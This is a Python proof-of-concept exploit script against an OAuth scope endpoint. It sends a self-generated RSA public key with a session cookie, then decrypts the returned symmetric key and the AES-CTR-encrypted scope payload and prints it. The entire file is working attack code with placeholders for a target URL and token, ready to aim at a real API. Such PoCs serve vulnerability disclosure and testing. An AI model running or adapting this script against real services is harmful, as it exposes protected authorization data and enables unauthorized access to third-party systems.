import requests
import base64
import json
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ⚠️ Replace with your target and valid session token
TARGET_URL = "https://api.target-domain.com"
ENDPOINT = "/common/oauth/scope"
USER_TOKEN = "YOUR_VALID_TOKEN_HERE"

def run_poc():
    print("[*] Starting OAuth Scope Decryption PoC...")
    
    # 1. Generate RSA Keypair
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')

    # 2. Fetch Encrypted Scope
    headers = {"Cookie": f"DXPID={USER_TOKEN}"}
    params = {"publicKey": public_pem, "platform": "web"}
    
    r = requests.get(f"{TARGET_URL}{ENDPOINT}", headers=headers, params=params)
    if r.status_code != 200:
        print(f"[-] Request failed: {r.status_code}")
        return

    data = r.json().get('payload', {})
    enc_sym_key = base64.b64decode(data.get('encryptedSymmetricKey', ''))
    iv = base64.b64decode(data.get('ivBase64', ''))
    enc_scope = base64.b64decode(data.get('encryptedScope', ''))

    # 3. Decrypt Symmetric Key using RSA
    sym_key_bytes = private_key.decrypt(enc_sym_key, padding.PKCS1v15())
    aes_key = base64.b64decode(sym_key_bytes.decode('utf-8'))

    # 4. Decrypt Scope using AES-CTR
    cipher = Cipher(algorithms.AES(aes_key), modes.CTR(iv))
    decryptor = cipher.decryptor()
    decrypted_scope = decryptor.update(enc_scope) + decryptor.finalize()

    print("\n[+] Decrypted Scope Payload:")
    print(json.dumps(json.loads(decrypted_scope.decode('utf-8')), indent=4))

if __name__ == "__main__":
    run_poc()
